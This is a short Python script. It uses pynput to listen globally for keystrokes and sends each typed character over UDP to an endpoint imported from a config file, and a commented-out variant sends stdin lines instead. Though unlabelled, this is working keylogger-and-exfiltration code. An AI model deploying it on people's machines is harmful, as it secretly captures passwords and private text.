import socket
from config import ENDPOINT as _ENDPOINT

if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def main1():
        while True:
            data = input()
            sock.sendto(str.encode(data), _ENDPOINT)
    
    def main2():
        from pynput.keyboard import Key, Listener

        def on_press(key):
            if hasattr(key,"char"):
                sock.sendto(str.encode(key.char), _ENDPOINT)
            else:
                pass
        with Listener(on_press=on_press) as listener:
            listener.join()
    # main1()
    main2()